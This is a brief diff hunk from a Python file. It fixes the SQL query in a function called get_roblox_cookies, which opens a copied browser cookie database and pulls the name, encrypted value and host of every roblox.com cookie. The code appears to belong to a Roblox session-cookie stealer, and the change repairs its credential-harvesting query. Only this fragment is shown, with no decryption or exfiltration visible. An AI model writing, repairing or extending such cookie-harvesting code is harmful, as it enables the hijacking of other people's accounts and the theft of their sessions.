@@ -83,7 +83,7 @@ def get_roblox_cookies(profile_folder):
         conn = sqlite3.connect(tmp)
         cursor = conn.cursor()
         cursor.execute(
-            "SELECT name, encrypted_value, domain FROM cookies WHERE host_key LIKE '%roblox.com%'"
+            "SELECT name, encrypted_value, host_key FROM cookies WHERE host_key LIKE '%roblox.com%'"
         )
 
         cookies = []
